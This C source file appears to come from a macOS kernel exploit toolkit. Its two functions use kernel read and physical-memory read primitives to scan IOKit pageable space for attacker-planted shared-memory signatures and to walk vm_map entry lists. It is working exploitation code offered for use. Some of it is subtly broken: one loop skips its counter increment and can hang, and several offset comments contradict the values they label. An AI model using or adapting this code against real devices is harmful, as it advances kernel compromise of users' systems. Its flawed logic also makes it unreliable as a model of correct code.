#include "offsets.h"
#include "kexecute.h"
#include "find_shmem.h"
#include "find_port.h"
#include "kutils.h"
#include "krw.h"

#include "../print.h"

void find_shmem_in_kernel(uint64_t *kva1, uint64_t *kva2, uint64_t command_buffer_shmem_sig, uint64_t segment_list_shmem_sig) {
    uint64_t command_buffer_shmem_data_kva = 0;
	uint64_t segment_list_shmem_data_kva = 0;
	uint64_t gIOKitPageableSpace_start = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x10);
	uint64_t gIOKitPageableSpace_end = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x18);

	int i = 0;

	while(1) {
		uint64_t current_kva = gIOKitPageableSpace_start + i * 0x1000;

		if(current_kva > gIOKitPageableSpace_end) {
			ERROR("failed to find where shmem allocated in kernel\n");
			break;
		}

		//check if valid readable kernel address to prevent kernel panic
		uint64_t current_pa = kvtophys(current_kva);
		if(current_pa == 0) continue;

		if(physread64(current_pa) == command_buffer_shmem_sig) {
			INFO("Found command_buffer_shmem in kernel: 0x%llx\n", current_kva-0x1000);
			command_buffer_shmem_data_kva = current_kva-0x1000;
            *kva1 = command_buffer_shmem_data_kva;
		}

		if(physread64(current_pa) == segment_list_shmem_sig) {
			INFO("Found segment_list_shmem in kernel: 0x%llx\n", current_kva-0x1000);
			segment_list_shmem_data_kva = current_kva-0x1000;
            *kva2 = segment_list_shmem_data_kva;
		}

		if(segment_list_shmem_data_kva && command_buffer_shmem_data_kva) break;

		i++;
	}
}

void find_shmem_in_kernel_2(uint64_t bruh) {
	uint64_t gIOKitPageableSpace_start = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x10);
	uint64_t gIOKitPageableSpace_end = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x18);
	uint64_t gIOKitPageableSpace_map = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x8);

	INFO("gIOKitPageableSpace_map = 0x%llx\n", gIOKitPageableSpace_map);
	// khexdump(gIOKitPageableSpace_map, 0x100);

	// 00000000 struct __attribute__((aligned(8))) _vm_map // sizeof=0xF8
// 00000000 {
// 00000000     lck_rw_t_0 lock;
// 00000010     vm_map_header hdr; <- HERE !!!!

// 00000000 struct __attribute__((aligned(8))) vm_map_header // sizeof=0x38
// 00000000 {                                       // XREF: _vm_map/r _vm_map_0/r ...
// 00000000     vm_map_links links;                 // XREF: vm_map_remap:loc_FFFFFF8000448364/r <- HERE !!!!

// 00000000 struct vm_map_links // sizeof=0x20
// 00000000 {                                       // XREF: vm_map_header/r
// 00000000                                         // vm_map_entry/r
// 00000000     vm_map_entry *prev;                 // XREF: vm_fault_wire+CC/w
// 00000000                                         // vm_fault_wire+357/w ...
// 00000008     vm_map_entry *next;                 // XREF: vm_fault_wire+C4/w
// 00000008                                         // vm_fault_wire+4C2/w ...
// 00000010     vm_map_offset_t start;              // XREF: vm_fault_wire+BC/w
// 00000010                                         // vm_map_delete+D4E/r ...
// 00000018     vm_map_offset_t end;                // XREF: vm_fault_wire+B4/w
// 00000018                                         // vm_fault_wire+5FE/w ...
// 00000020 };

	uint64_t gIOKitPageableSpace_map_prev = kread64(gIOKitPageableSpace_map+0x10);	//0x10 = vme_prev
	printf("gIOKitPageableSpace_map's prev = 0x%llx\n", gIOKitPageableSpace_map_prev);
	uint64_t gIOKitPageableSpace_map_next = kread64(gIOKitPageableSpace_map+0x18);	//0x18 = vme_next
	printf("gIOKitPageableSpace_map's next = 0x%llx\n", gIOKitPageableSpace_map_next);
	uint64_t gIOKitPageableSpace_map_start = kread64(gIOKitPageableSpace_map+0x20);	//0x18 = start
	printf("gIOKitPageableSpace_map's start = 0x%llx\n", gIOKitPageableSpace_map_start);
	uint64_t gIOKitPageableSpace_map_end = kread64(gIOKitPageableSpace_map+0x28);	//0x18 = end
	printf("gIOKitPageableSpace_map's end = 0x%llx\n", gIOKitPageableSpace_map_end);

	printf("Going to gIOKitPageableSpace_map's next\n");
	uint64_t current_map = gIOKitPageableSpace_map_next;

	int i = 0;
	while(1) {
		
		uint64_t current_map_start = kread64(current_map + 0x10);
		uint64_t current_map_end = kread64(current_map + 0x18);
		uint64_t current_map_prev = kread64(current_map + 0x0);
		uint64_t current_map_next = kread64(current_map + 0x8);

		printf("=============\n");
		printf("current_map_start = 0x%llx, current_map_end = 0x%llx\n", current_map_start, current_map_end);
		printf("current_map_prev = 0x%llx, current_map_next = 0x%llx\n", current_map_prev, current_map_next);
		printf("=============\n");
		current_map = current_map_next;

		if(bruh == current_map_start) {
			printf("!===========!\n");
			printf("current_map_start = 0x%llx, current_map_end = 0x%llx\n", current_map_start, current_map_end);
			printf("current_map_prev = 0x%llx, current_map_next = 0x%llx\n", current_map_prev, current_map_next);
			printf("=============\n");
			break;
		}
		// if(i > 1000) break;
		// i++;
	}



	khexdump(gIOKitPageableSpace_map, 0x100);

}